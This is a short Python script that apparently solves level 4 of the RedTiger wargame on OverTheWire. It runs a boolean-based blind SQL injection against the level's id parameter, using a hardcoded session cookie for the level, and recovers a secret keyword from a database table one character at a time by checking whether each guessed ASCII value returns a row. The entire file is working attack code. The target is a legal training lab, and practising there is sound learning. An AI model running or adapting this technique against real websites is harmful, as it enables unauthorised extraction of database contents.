import requests
import string
import re

keword=''
char=string.printable
url='http://redtiger.labs.overthewire.org/level4.php?id=1 and 1=(select ascii(substr((select keyword from level4_secret),{0},1))={1})'
cookie={'level4login':'put_the_kitten_on_your_head'}
for i in range(1,22):
    for c in char:
        test=url.format(i,ord(c))
        r=requests.get(test,cookies=cookie)
        if re.findall('Query returned 1 rows.',r.text):
            print (i,c)
            keword+=c
print (keword)